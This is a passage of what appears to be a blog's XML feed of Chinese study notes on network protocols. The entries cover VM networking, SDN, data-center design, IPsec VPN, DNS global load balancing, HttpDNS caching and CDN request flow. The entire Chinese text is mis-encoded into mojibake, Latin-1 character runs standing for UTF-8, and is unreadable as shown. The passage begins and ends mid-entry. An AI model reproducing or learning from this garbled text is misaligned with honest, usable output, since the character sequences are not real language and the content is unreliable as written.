·å°†ä¸¤ä¸ªè™šæ‹Ÿæœºé…ç½®ç›¸åŒçš„å­ç½‘ç½‘æ®µï¼Œä¸¤å°è™šæ‹Ÿæœºå°±èƒ½å¤Ÿç›¸äº’é€šä¿¡ã€‚â€¨è™šæ‹Ÿæœºè®¿é—®å¤–éƒ¨ï¼š1ï¼‰æ¡¥æ¥ï¼šè™šæ‹Ÿæœºå’Œç‰©ç†æœºç½‘å¡è¿æ¥åœ¨åŒä¸€ä¸ªç½‘æ¡¥ä¸Šï¼Œä½¿ç”¨åŒä¸€ç½‘æ®µï¼Œå’Œç‰©ç†æœºä½¿ç”¨åŒä¸€ä¸ªDHCPç­‰æœåŠ¡å™¨ï¼›è§£å†³äº†è™šæ‹Ÿæœºé—´ã€è™šæ‹Ÿæœºå’Œå¤–éƒ¨çš„é€šä¿¡é—®é¢˜ï¼Œä½†åŒä¸€å­ç½‘å†…è®¾å¤‡è¿‡å¤šä¼šå¼•å‘å¹¿æ’­é—®é¢˜ï¼›2ï¼‰NATï¼šç‰©ç†æœºä¼šåˆ›å»ºè™šæ‹Ÿçš„DHCPæœåŠ¡å™¨å’Œç‹¬ç«‹çš„ç½‘æ¡¥br0ï¼Œè™šæ‹Ÿæœºè¦æƒ³è®¿é—®äº’è”ç½‘ï¼Œéœ€è¦é€šè¿‡ br0 è¿åˆ°è·¯ç”±å™¨ä¸Šï¼Œç„¶åé€šè¿‡è·¯ç”±å™¨å°†è¯·æ±‚ NAT æˆä¸ºç‰©ç†ç½‘ç»œçš„åœ°å€ï¼Œè½¬å‘åˆ°ç‰©ç†ç½‘ç»œã€‚<br>è™šæ‹Ÿæœºéš”ç¦»é—®é¢˜ï¼šåŸºäºç‰©ç†ç½‘å¡ï¼Œä¸ºæ¯ä¸ªç”¨æˆ·ç”¨ vconfig åˆ›å»ºä¸€ä¸ªå¸¦ VLAN çš„ç½‘å¡ã€‚ä¸åŒçš„ç”¨æˆ·ä½¿ç”¨ä¸åŒçš„è™šæ‹Ÿç½‘æ¡¥ï¼Œå¸¦ VLAN çš„è™šæ‹Ÿç½‘å¡ä¹Ÿè¿æ¥åˆ°è™šæ‹Ÿç½‘æ¡¥ä¸Šã€‚</p><h3 id="SDNï¼ˆè½¯ä»¶å®šä¹‰ç½‘ç»œï¼‰ï¼š"><a href="#SDNï¼ˆè½¯ä»¶å®šä¹‰ç½‘ç»œï¼‰ï¼š" class="headerlink" title="SDNï¼ˆè½¯ä»¶å®šä¹‰ç½‘ç»œï¼‰ï¼š"></a>SDNï¼ˆè½¯ä»¶å®šä¹‰ç½‘ç»œï¼‰ï¼š</h3><p>OpenFlow æ˜¯ SDN æ§åˆ¶å™¨å’Œç½‘ç»œè®¾å¤‡ä¹‹é—´äº’é€šçš„å—å‘æ¥å£åè®®ï¼ŒOpenvSwitch ç”¨äºåˆ›å»ºè½¯<br>ä»¶çš„è™šæ‹Ÿäº¤æ¢æœºã€‚OpenvSwitch æ˜¯æ”¯æŒ OpenFlow åè®®çš„ï¼Œå½“ç„¶ä¹Ÿæœ‰ä¸€äº›ç¡¬ä»¶äº¤æ¢æœºä¹Ÿæ”¯æŒ<br>OpenFlow åè®®ã€‚å®ƒä»¬éƒ½å¯ä»¥è¢«ç»Ÿä¸€çš„ SDN æ§åˆ¶å™¨ç®¡ç†ï¼Œä»è€Œå®ç°ç‰©ç†æœºå’Œè™šæ‹Ÿæœºçš„ç½‘ç»œè¿<br>é€šã€‚</p>]]></content>
    
    
    <categories>
      
      <category>ç½‘ç»œ</category>
      
      <category>ç§»åŠ¨ç½‘ç»œ</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ç½‘ç»œ</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ã€Šè¶£è°ˆç½‘ç»œåè®®ã€‹å­¦ä¹ æ€»ç»“ï¼š21-22è®²</title>
    <link href="/2020/10/31/%E3%80%8A%E8%B6%A3%E8%B0%88%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE%E3%80%8B%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93%EF%BC%9A21-22%E8%AE%B2/"/>
    <url>/2020/10/31/%E3%80%8A%E8%B6%A3%E8%B0%88%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE%E3%80%8B%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93%EF%BC%9A21-22%E8%AE%B2/</url>
    
    <content type="html"><![CDATA[<h3 id="æ•°æ®ä¸­å¿ƒï¼š"><a href="#æ•°æ®ä¸­å¿ƒï¼š" class="headerlink" title="æ•°æ®ä¸­å¿ƒï¼š"></a>æ•°æ®ä¸­å¿ƒï¼š</h3><p>1ã€è¾¹ç•Œè·¯ç”±å™¨ï¼ˆBorder Routerï¼‰ï¼šæ•°æ®ä¸­å¿ƒçš„å…¥å£å’Œå‡ºå£ä¹Ÿæ˜¯è·¯ç”±å™¨ï¼Œç”±äºåœ¨æ•°æ®ä¸­å¿ƒçš„è¾¹ç•Œï¼Œç§°ä¸ºè¾¹ç•Œè·¯ç”±å™¨ï¼ˆBorder Routerï¼‰ï¼Œè¾¹ç•Œè·¯ç”±å™¨ä¼šè¿æ¥å¤šä¸ªè¿è¥å•†ç½‘ç»œã€‚<br>2ã€ç½‘å¡ç»‘å®šï¼šå¤šä¸ªç½‘å¡ã€å¤šä¸ªç½‘çº¿åˆ©ç”¨LACPï¼ˆLink Aggregation Control Protocolï¼‰åè®®èšåˆæˆä¸€ä¸ªç½‘å¡ã€ä¸€ä¸ªç½‘çº¿ã€‚<br>3ã€äº¤æ¢æœºé«˜å¯ç”¨æ–¹å¼ï¼š1ï¼‰ä½¿ç”¨STDåè®®è¿æ¥ï¼Œå½¢æˆä¸»å¤‡ï¼›2ï¼‰åˆ©ç”¨å †å æŠ€æœ¯ï¼Œå°†å¤šä¸ªäº¤æ¢æœºå½¢æˆä¸€ä¸ªé€»è¾‘äº¤æ¢æœºï¼Œæ¥å…¥å±‚äº¤æ¢æœºå¤šæ ¹çº¿åˆ†åˆ«è¿æ¥åˆ°å¤šä¸ªäº¤æ¢æœºä¸Šï¼Œå¹¶ä¸”é€šè¿‡å †å çš„ç§æœ‰åè®®ï¼Œå½¢æˆåŒæ´»çš„è¿æ¥æ–¹å¼ã€‚<br>4ã€å¯ç”¨åŒºï¼šæ±‡èšå±‚å°†å¤§é‡çš„è®¡ç®—èŠ‚ç‚¹ç›¸äº’è¿æ¥åœ¨ä¸€èµ·ï¼Œå½¢æˆä¸€ä¸ªé›†ç¾¤ã€‚åœ¨è¿™ä¸ªé›†ç¾¤é‡Œé¢ï¼ŒæœåŠ¡å™¨ä¹‹é—´é€šè¿‡äºŒå±‚äº’é€šï¼Œè¿™ä¸ªåŒºåŸŸå¸¸ç§°ä¸ºä¸€ä¸ª PODï¼ˆPoint Of Deliveryï¼‰ï¼›<br>5ã€æ ¸å¿ƒäº¤æ¢æœºï¼šè¿æ¥å¤šä¸ªå¯ç”¨åŒºçš„äº¤æ¢æœºã€‚<br>6ã€äºŒå±‚è®¾å¤‡é«˜å¯ç”¨æŠ€æœ¯ï¼šTRILLï¼ˆTransparent Interconnection of Lots of Linkï¼‰ï¼Œå³å¤šé“¾æ¥é€æ˜äº’è”åè®®ã€‚è¿è¡Œ TRILL åè®®çš„äº¤æ¢æœºç§°ä¸º RBridgeï¼Œæ˜¯æ ¹æ®macè¿›è¡Œè·¯ç”±è½¬å‘çš„ç½‘æ¡¥è®¾å¤‡ï¼Œå¯è®¡ç®—æœ€çŸ­è·¯å¾„ï¼Œä¹Ÿå¯é€šè¿‡ç­‰ä»·è·¯ç”±æ–¹å¼è¿›è¡Œè´Ÿè½½å‡è¡¡å’Œé«˜å¯ç”¨ã€‚</p><h3 id="VPNï¼š"><a href="#VPNï¼š" class="headerlink" title="VPNï¼š"></a>VPNï¼š</h3><p>VPNï¼Œå…¨å Virtual Private Networkï¼Œè™šæ‹Ÿä¸“ç”¨ç½‘ï¼Œå°±æ˜¯åˆ©ç”¨å¼€æ”¾çš„å…¬ä¼—ç½‘ç»œï¼Œå»ºç«‹ä¸“ç”¨æ•°æ®ä¼ è¾“é€šé“ï¼Œå°†è¿œç¨‹çš„åˆ†æ”¯æœºæ„ã€ç§»åŠ¨åŠå…¬äººå‘˜ç­‰è¿æ¥èµ·æ¥ã€‚<br>VPN é€šè¿‡éš§é“æŠ€æœ¯åœ¨å…¬ä¼—ç½‘ç»œä¸Šä»¿çœŸä¸€æ¡ç‚¹åˆ°ç‚¹çš„ä¸“çº¿ï¼Œæ¶‰åŠä¸‰ç§åè®®ï¼šä¹˜å®¢åè®®ã€éš§é“åè®®å’Œæ‰¿è½½åè®®ã€‚<br>IPsec VPNï¼ŒåŸºäº IP åè®®çš„å®‰å…¨éš§é“åè®®ã€‚å…·å¤‡ç§å¯†æ€§ã€å®Œæ•´æ€§ã€çœŸå®æ€§çš„æœºåˆ¶ï¼›é€šè¿‡é¢„å…±äº«å¯†é’¥æˆ–æ•°å­—ç­¾åçš„æ–¹å¼ç¡®è®¤é€šä¿¡æ–¹èº«ä»½ã€‚<br>IKEç»„ä»¶ï¼šè¿›è¡Œå¯†é’¥äº¤æ¢ï¼›<br>SAç»„ä»¶ï¼šè¿›è¡Œè¿æ¥ç»´æŠ¤ï¼›<br>IPsec VPNå»ºç«‹è¿‡ç¨‹ï¼š1ï¼‰ä½¿ç”¨DHç®—æ³•è®¡ç®—å‡ºå¯¹ç§°å¯†é’¥Kï¼›2ï¼‰å»ºç«‹ IPsec SAï¼Œåœ¨è¿™ä¸ª SA é‡Œé¢ï¼ŒåŒæ–¹ä¼šç”Ÿæˆä¸€ä¸ªéšæœºçš„å¯¹ç§°å¯†é’¥ Mï¼Œç”± K åŠ å¯†ä¼ ç»™å¯¹æ–¹ï¼Œç„¶åä½¿ç”¨ M è¿›è¡ŒåŒæ–¹æ¥ä¸‹æ¥é€šä¿¡çš„æ•°æ®ã€‚å¯¹ç§°å¯†é’¥Må…·æœ‰æ—¶æ•ˆæ€§ï¼›IPsec SA é‡Œé¢æœ‰ä»¥ä¸‹å†…å®¹ï¼š<br>SPIï¼ˆSecurity Parameter Indexï¼‰ï¼Œç”¨äºæ ‡è¯†ä¸åŒçš„è¿æ¥ï¼›<br>åŒæ–¹å•†é‡å¥½çš„åŠ å¯†ç®—æ³•ã€å“ˆå¸Œç®—æ³•å’Œå°è£…æ¨¡å¼ï¼›<br>ç”Ÿå­˜å‘¨æœŸï¼Œè¶…è¿‡è¿™ä¸ªå‘¨æœŸï¼Œå°±éœ€è¦é‡æ–°ç”Ÿæˆä¸€ä¸ª IPsec SAï¼Œé‡æ–°ç”Ÿæˆå¯¹ç§°å¯†é’¥</p>]]></content>
    
    
    <categories>
      
      <category>ç½‘ç»œ</category>
      
      <category>æ•°æ®ä¸­å¿ƒ</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ç½‘ç»œ</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ã€Šè¶£è°ˆç½‘ç»œåè®®ã€‹å­¦ä¹ æ€»ç»“ï¼š18-20è®²</title>
    <link href="/2020/10/31/%E3%80%8A%E8%B6%A3%E8%B0%88%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE%E3%80%8B%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93%EF%BC%9A18-20%E8%AE%B2/"/>
    <url>/2020/10/31/%E3%80%8A%E8%B6%A3%E8%B0%88%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE%E3%80%8B%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93%EF%BC%9A18-20%E8%AE%B2/</url>
    
    <content type="html"><![CDATA[<h3 id="DNSå…¨å±€è´Ÿè½½å‡è¡¡è¿‡ç¨‹ï¼š"><a href="#DNSå…¨å±€è´Ÿè½½å‡è¡¡è¿‡ç¨‹ï¼š" class="headerlink" title="DNSå…¨å±€è´Ÿè½½å‡è¡¡è¿‡ç¨‹ï¼š"></a>DNSå…¨å±€è´Ÿè½½å‡è¡¡è¿‡ç¨‹ï¼š</h3><p>1ã€å¦‚å®¢æˆ·ç«¯è®¿é—®æŸåŸŸåæ—¶ï¼ˆexample.comï¼‰ï¼Œä¼šå…ˆè¯·æ±‚æœ¬åœ°DNSè§£æå™¨ï¼Œæœ¬åœ°DNSè§£æå™¨ä¼šæŸ¥çœ‹æœ¬åœ°ç¼“å­˜æ˜¯å¦æœ‰è¯¥åŸŸåçš„è®°å½•ï¼Œæœ‰åˆ™ç›´æ¥ä½¿ç”¨ï¼Œæ— åˆ™è¯·æ±‚æœ¬åœ°DNSæœåŠ¡å™¨ï¼›<br>2ã€æœ¬åœ°DNSæœåŠ¡å™¨ä¸€èˆ¬éƒ¨ç½²åœ¨æ•°æ®ä¸­å¿ƒæˆ–è€…æ‰€åœ¨è¿è¥å•†ç½‘ç»œä¸­ï¼Œæœ¬åœ°DNSæœåŠ¡å™¨æŸ¥çœ‹æ˜¯å¦æœ‰ç¼“å­˜ï¼Œè‹¥æ— ç¼“å­˜ï¼Œåˆ™è¯·æ±‚æ ¹DNSæœåŠ¡å™¨ï¼›<br>3ã€æ ¹DNSæœåŠ¡å™¨è§£æä¼šï¼Œä¼šæä¾›ç®¡ç†.comåŸŸåçš„é¡¶çº§åŸŸåæœåŠ¡å™¨åœ°å€ï¼Œæœ¬åœ°DNSæœåŠ¡å™¨ç»§ç»­è¯·æ±‚è¯¥åœ°å€ï¼›<br>4ã€é¡¶çº§åŸŸåæœåŠ¡å™¨è§£æåï¼Œåˆ™æä¾›ç®¡ç†example.comçš„æƒå¨åŸŸåæœåŠ¡å™¨åœ°å€ï¼Œæœ¬åœ°DNSæœåŠ¡å™¨ç»§ç»­è¯·æ±‚è¯¥åœ°å€ï¼›<br>5ã€åœ¨example.comçš„æƒå¨åŸŸåæœåŠ¡å™¨ä¸­ï¼Œä¸€èˆ¬ä¼šä»¥CNAMEçš„æ–¹å¼é…ç½®example.comçš„åˆ«åï¼Œç„¶åè®©æœ¬åœ°DNSæœåŠ¡å™¨è¯·æ±‚GSLBè§£æè¿™ä¸ªåˆ«åï¼ŒGSLB å°±å¯ä»¥åœ¨è§£æè¿™ä¸ªåŸŸåçš„è¿‡ç¨‹ä¸­ï¼Œé€šè¿‡è‡ªå·±çš„ç­–ç•¥å®ç°è´Ÿè½½å‡è¡¡ï¼Œè¿”å›ç»™å®¢æˆ·ç«¯å¯¹åº”çš„IPåœ°å€ã€‚</p><h3 id="ä¼ ç»ŸDNSå­˜åœ¨çš„é—®é¢˜ï¼š"><a href="#ä¼ ç»ŸDNSå­˜åœ¨çš„é—®é¢˜ï¼š" class="headerlink" title="ä¼ ç»ŸDNSå­˜åœ¨çš„é—®é¢˜ï¼š"></a>ä¼ ç»ŸDNSå­˜åœ¨çš„é—®é¢˜ï¼š</h3><p>1ã€åŸŸåç¼“å­˜é—®é¢˜ï¼›2ã€åŸŸåè½¬å‘é—®é¢˜ï¼›3ã€åŸŸåæ›´æ–°é—®é¢˜ï¼›4ã€è§£æå»¶è¿Ÿé—®é¢˜</p><h3 id="HttpDNSçš„å·¥ä½œæ¨¡å¼ï¼š"><a href="#HttpDNSçš„å·¥ä½œæ¨¡å¼ï¼š" class="headerlink" title="HttpDNSçš„å·¥ä½œæ¨¡å¼ï¼š"></a>HttpDNSçš„å·¥ä½œæ¨¡å¼ï¼š</h3><p>HttpDNSå¾€å¾€åœ¨ç§»åŠ¨ç«¯ä½¿ç”¨ï¼Œå®¢æˆ·ç«¯çš„SDKåŠ¨æ€çš„è¯·æ±‚æœåŠ¡ç«¯ï¼Œè·å–HttpDNSæœåŠ¡å™¨çš„IPåˆ—è¡¨ç¼“å­˜åœ¨æœ¬åœ°ï¼Œå½“æ‰‹æœºè¦è¯·æ±‚ä¸€ä¸ªç½‘å€æ—¶ï¼Œä¼šä¼˜å…ˆä½¿ç”¨æœ¬åœ°ç¼“å­˜ï¼Œè‹¥æœ¬åœ°æ— å¯¹åº”ç¼“å­˜ï¼Œåˆ™è¯·æ±‚HttpDNSæœåŠ¡å™¨ï¼Œç”±æœåŠ¡å™¨è¿”å›è¦è®¿é—®çš„ç½‘ç«™çš„IPåˆ—è¡¨</p><h3 id="HttpDNSçš„ç¼“å­˜è®¾è®¡ï¼š"><a href="#HttpDNSçš„ç¼“å­˜è®¾è®¡ï¼š" class="headerlink" title="HttpDNSçš„ç¼“å­˜è®¾è®¡ï¼š"></a>HttpDNSçš„ç¼“å­˜è®¾è®¡ï¼š</h3><p>HttpDNS çš„ç¼“å­˜è®¾è®¡ç­–ç•¥åˆ†ä¸ºå®¢æˆ·ç«¯ã€ç¼“å­˜ã€æ•°æ®æºä¸‰å±‚ã€‚å¯¹åº”æ‰‹æœºå®¢æˆ·ç«¯ã€DNSç¼“å­˜ã€HttpDNSæœåŠ¡å™¨ã€‚<br>å®¢æˆ·ç«¯SDKä¸­çš„ç¼“å­˜ä¼šä¸¥æ ¼æŒ‰ç…§ç¼“å­˜è¿‡æœŸæ—¶é—´ï¼Œå¦‚æœç¼“å­˜æœªå‘½ä¸­æˆ–è¿‡æœŸï¼Œä¼šå‘èµ·ä¸€æ¬¡è§£æï¼Œä¿éšœè®°å½•æ˜¯æœ€æ–°çš„ï¼›<br>è§£æåˆ†ä¸ºåŒæ­¥å’Œå¼‚æ­¥ä¸¤ç§æ–¹å¼ï¼š</p><h4 id="1ã€åŒæ­¥è§£æï¼š"><a href="#1ã€åŒæ­¥è§£æï¼š" class="headerlink" title="1ã€åŒæ­¥è§£æï¼š"></a>1ã€åŒæ­¥è§£æï¼š</h4><p>ç›´æ¥è°ƒç”¨ HttpDNS çš„æ¥å£ï¼Œè¿”å›æœ€æ–°çš„è®°å½•ï¼Œæ›´æ–°ç¼“å­˜ï¼›ä¼˜ç‚¹æ˜¯å®æ—¶æ€§å¥½ï¼›ç¼ºç‚¹æ˜¯å¦‚æœæœ‰å¤šä¸ªè¯·æ±‚éƒ½å‘ç°è¿‡æœŸçš„æ—¶å€™ï¼ŒåŒæ—¶ä¼šè¯·æ±‚HttpDNS å¤šæ¬¡ï¼Œé€ æˆèµ„æºæµªè´¹ï¼›<br>åŒæ­¥æ›´æ–°çš„æ–¹å¼å¯¹åº”åˆ°åº”ç”¨æ¶æ„ä¸­ç¼“å­˜çš„ Cache-Aside æœºåˆ¶ï¼Œä¹Ÿå³å…ˆè¯»ç¼“å­˜ï¼Œä¸å‘½ä¸­è¯»æ•°æ®åº“ï¼ŒåŒæ—¶å°†ç»“æœå†™å…¥ç¼“å­˜ã€‚</p><h4 id="2ã€å¼‚æ­¥è§£æï¼š"><a href="#2ã€å¼‚æ­¥è§£æï¼š" class="headerlink" title="2ã€å¼‚æ­¥è§£æï¼š"></a>2ã€å¼‚æ­¥è§£æï¼š</h4><p>æ·»åŠ ä¸€ä¸ªè§£æä»»åŠ¡åˆ°åå°ï¼Œç”±åå°ä»»åŠ¡è°ƒç”¨ HttpDNS çš„æ¥å£ï¼›ä¼˜ç‚¹æ˜¯ï¼Œå¯ä»¥å°†å¤šä¸ªè¯·æ±‚éƒ½å‘ç°è¿‡æœŸçš„æƒ…å†µï¼Œåˆå¹¶ä¸ºä¸€ä¸ªå¯¹äº HttpDNS çš„è¯·æ±‚ä»»åŠ¡ï¼Œåªæ‰§è¡Œä¸€æ¬¡ï¼Œå‡å°‘ HttpDNS çš„å‹åŠ›ã€‚åŒæ—¶å¯ä»¥åœ¨å³å°†è¿‡æœŸçš„æ—¶å€™ï¼Œå°±åˆ›å»ºä¸€ä¸ªä»»åŠ¡è¿›è¡Œé¢„åŠ è½½ï¼Œé˜²æ­¢è¿‡æœŸä¹‹åå†åˆ·æ–°ï¼Œç§°ä¸ºé¢„åŠ è½½ï¼›ç¼ºç‚¹æ˜¯å½“å‰è¯·æ±‚æ‹¿åˆ°è¿‡æœŸæ•°æ®çš„æ—¶å€™ï¼Œå¦‚æœå®¢æˆ·ç«¯å…è®¸ä½¿ç”¨è¿‡æœŸæ•°æ®ï¼Œåˆ™å­˜åœ¨è¿‡æœŸæ•°æ®ä¸èƒ½è®¿é—®é£é™©ã€‚<br>å¼‚æ­¥æ›´æ–°çš„æœºåˆ¶å¯¹åº”åˆ°åº”ç”¨æ¶æ„ä¸­ç¼“å­˜çš„ Refresh-Ahead æœºåˆ¶ï¼Œå³ä¸šåŠ¡ä»…ä»…è®¿é—®ç¼“å­˜ï¼Œå½“è¿‡æœŸçš„æ—¶å€™å®šæœŸåˆ·æ–°ã€‚</p><h3 id="HttpDNSè°ƒåº¦è®¾è®¡ï¼š"><a href="#HttpDNSè°ƒåº¦è®¾è®¡ï¼š" class="headerlink" title="HttpDNSè°ƒåº¦è®¾è®¡ï¼š"></a>HttpDNSè°ƒåº¦è®¾è®¡ï¼š</h3><p>1ã€åœ¨å®¢æˆ·ç«¯ï¼Œå®¢æˆ·ç«¯çš„SDKä¼šæ”¶é›†æ‰‹æœºçš„ä½ç½®ã€è¿è¥å•†ã€ç½‘ç»œæƒ…å†µç­‰ä¿¡æ¯ï¼ŒHttpDNS æœåŠ¡ç«¯æ ¹æ®è¿™äº›ä¿¡æ¯ï¼Œé€‰æ‹©æœ€ä½³çš„æœåŠ¡èŠ‚ç‚¹è¿”å›ã€‚<br>2ã€åœ¨æœåŠ¡ç«¯ï¼Œåº”ç”¨å¯ä»¥é€šè¿‡è°ƒç”¨ HttpDNS çš„ç®¡ç†æ¥å£ï¼Œé…ç½®ä¸åŒæœåŠ¡è´¨é‡çš„ä¼˜å…ˆçº§ã€æƒé‡ã€‚HttpDNS ä¼šæ ¹æ®è¿™äº›ç­–ç•¥ç»¼åˆåœ°ç†ä½ç½®å’Œçº¿è·¯çŠ¶å†µç®—å‡ºä¸€ä¸ªæ’åºï¼Œä¼˜å…ˆè®¿é—®å½“å‰é‚£äº›ä¼˜è´¨çš„ã€æ—¶å»¶ä½çš„ IP åœ°å€ã€‚</p><h3 id="CDNï¼ˆå†…å®¹åˆ†å‘ç½‘ç»œï¼‰ï¼š"><a href="#CDNï¼ˆå†…å®¹åˆ†å‘ç½‘ç»œï¼‰ï¼š" class="headerlink" title="CDNï¼ˆå†…å®¹åˆ†å‘ç½‘ç»œï¼‰ï¼š"></a>CDNï¼ˆå†…å®¹åˆ†å‘ç½‘ç»œï¼‰ï¼š</h3><p>CDNåŠ é€Ÿæ„æ€å°±æ˜¯åœ¨ç”¨æˆ·å’Œæˆ‘ä»¬çš„æœåŠ¡å™¨ä¹‹é—´åŠ ä¸€ä¸ªç¼“å­˜æœºåˆ¶ï¼Œé€šè¿‡è¿™ä¸ªç¼“å­˜æœºåˆ¶åŠ¨æ€è·å–IPåœ°å€æ ¹æ®åœ°ç†ä½ç½®ï¼Œè®©ç”¨æˆ·åˆ°æœ€è¿‘çš„æœåŠ¡å™¨è®¿é—®ã€‚<br>CDNç³»ç»Ÿèƒ½å®æ—¶çš„æ ¹æ®ç½‘ç»œæµé‡å’Œå„èŠ‚ç‚¹çš„è¿æ¥ï¼Œè´Ÿè½½çŠ¶å†µåŠç”¨æˆ·çš„è·ç¦»å’Œå“åº”æ—¶é—´ç­‰ç»¼åˆä¿¡æ¯å°†ç”¨æˆ·çš„è¯·æ±‚é‡æ–°å¯¼å‘ç¦»ç”¨æˆ·æœ€è¿‘çš„æœåŠ¡èŠ‚ç‚¹ä¸Šï¼Œå…¶ç›®çš„æ˜¯ä½¿ç”¨æˆ·èƒ½å°±è¿‘çš„è·å–è¯·æ±‚æ•°æ®ï¼Œè§£å†³ç½‘ç»œæ‹¥å µï¼Œæé«˜è®¿é—®é€Ÿåº¦ï¼Œè§£å†³ç”±äºç½‘ç»œå¸¦å®½å°ï¼Œç”¨æˆ·è®¿é—®é‡å¤§ï¼Œç½‘ç‚¹åˆ†å¸ƒä¸å‡ç­‰åŸå› å¯¼è‡´çš„è®¿é—®é€Ÿåº¦æ…¢çš„é—®é¢˜ã€‚</p><h3 id="CDNåˆ†å‘è¿‡ç¨‹ï¼š"><a href="#CDNåˆ†å‘è¿‡ç¨‹ï¼š" class="headerlink" title="CDNåˆ†å‘è¿‡ç¨‹ï¼š"></a>CDNåˆ†å‘è¿‡ç¨‹ï¼š</h3><p>ç”¨æˆ·å‘æµè§ˆå™¨æä¾›éœ€è¦è®¿é—®çš„åŸŸåï¼›</p><p>æµè§ˆå™¨è°ƒç”¨åŸŸåè§£æåº“å¯¹åŸŸåè¿›è¡Œè§£æï¼Œç”±äºCDNå¯¹åŸŸåè§£æè¿‡ç¨‹è¿›è¡Œäº†è°ƒæ•´ï¼Œæ‰€ä»¥è§£æå‡½æ•°åº“ä¸€èˆ¬å¾—åˆ°çš„æ˜¯è¯¥åŸŸåå¯¹åº”çš„CNAMEè®°å½•ï¼Œä¸ºäº†å¾—åˆ°å®é™…çš„IPåœ°å€ï¼Œæµè§ˆå™¨éœ€è¦å†æ¬¡å¯¹è·å¾—çš„CNAMEåŸŸåè¿›è¡Œè§£æä»¥å¾—åˆ°å®é™…çš„IPåœ°å€ï¼›åœ¨æ­¤è¿‡ç¨‹ä¸­ï¼Œä½¿ç”¨çš„å…¨å±€è´Ÿè½½å‡è¡¡DNSè§£æã€‚å¦‚æ ¹æ®åœ°ç†ä½ç½®ä¿¡æ¯è§£æå¯¹åº”çš„IPåœ°å€ï¼Œä½¿å¾—ç”¨æˆ·èƒ½å°±è¿‘è®¿é—®ï¼›</p><p>æ­¤æ¬¡è§£æå¾—åˆ°CDNç¼“å­˜æœåŠ¡å™¨çš„IPåœ°å€ï¼Œæµè§ˆå™¨åœ¨å¾—åˆ°å®é™…çš„ipåœ°å€ä¹‹åï¼Œå‘ç¼“å­˜æœåŠ¡å™¨å‘å‡ºè®¿é—®è¯·æ±‚ï¼›</p><p>ç¼“å­˜æœåŠ¡å™¨æ ¹æ®æµè§ˆå™¨æä¾›çš„è¦è®¿é—®çš„åŸŸåï¼Œé€šè¿‡Cacheå†…éƒ¨ä¸“ç”¨DNSè§£æå¾—åˆ°æ­¤åŸŸåçš„å®é™…IPåœ°å€ï¼Œå†ç”±ç¼“å­˜æœåŠ¡å™¨å‘æ­¤å®é™…IPåœ°å€æäº¤è®¿é—®è¯·æ±‚ï¼›</p><p>ç¼“å­˜æœåŠ¡å™¨ä»å®é™…IPåœ°å€å¾—åˆ°å†…å®¹ä»¥åï¼Œä¸€æ–¹é¢åœ¨æœ¬åœ°è¿›è¡Œä¿å­˜ï¼Œä»¥å¤‡ä»¥åä½¿ç”¨ï¼ŒäºŒæ–¹é¢æŠŠè·å–çš„æ•°æ®æ”¾å›ç»™å®¢æˆ·ç«¯ï¼Œå®Œæˆæ•°æ®æœåŠ¡è¿‡ç¨‹ï¼›</p><p>å®¢æˆ·ç«¯å¾—åˆ°ç”±ç¼“å­˜æœåŠ¡å™¨è¿”å›çš„æ•°æ®ä»¥åæ˜¾ç¤ºå‡ºæ¥å¹¶å®Œæˆæ•´ä¸ªæµè§ˆçš„æ•°æ®è¯·æ±‚è¿‡ç¨‹ã€‚</p><h3 id="åŠ¨æ€CDNï¼š"><a href="#åŠ¨æ€CDNï¼š" class="headerlink" title="åŠ¨æ€CDNï¼š"></a>åŠ¨æ€CDNï¼š</h3><p>1ã€è¾¹ç¼˜è®¡ç®—æ¨¡å¼ï¼šå®šæ—¶ä»æºæ•°æ®é‚£é‡ŒåŒæ­¥å­˜å‚¨çš„æ•°æ®ï¼Œç„¶ååœ¨è¾¹ç¼˜è¿›è¡Œè®¡ç®—å¾—åˆ°ç»“æœã€‚<br>2ã€è·¯å¾„ä¼˜åŒ–æ¨¡å¼ï¼šæ•°æ®çš„è®¡ç®—åœ¨æºç«™ç”Ÿäº§ï¼Œæ•°æ®ä¸‹å‘é€šè¿‡CDNç½‘ç»œï¼Œå¹¶å¯¹è·¯å¾„è¿›è¡Œä¼˜åŒ–.</p>]]></content>
    
    
    <categories>
      
      <category>ç½‘ç»œ</category>
      
      <category>DNS</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ç½‘ç»œ</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ã€Šè¶£è°ˆç½‘ç»œåè®®ã€‹å­¦ä¹ æ€»ç»“ï¼š16-17è®²</title>
    <link href="/2020/10/31/%E3%80%8A%E8%B6%A3%E8%B0%88%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE%E3%80%8B%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93%EF%BC%9A16-17%E8%AE%B2/"/>
    <url>/2020/10/31/%E3%80%8A%E8%B6%A3%E8%B0%88%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE%E3%80%8B%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93%EF%BC%9A16-17%E8%AE%B2/</url>
    
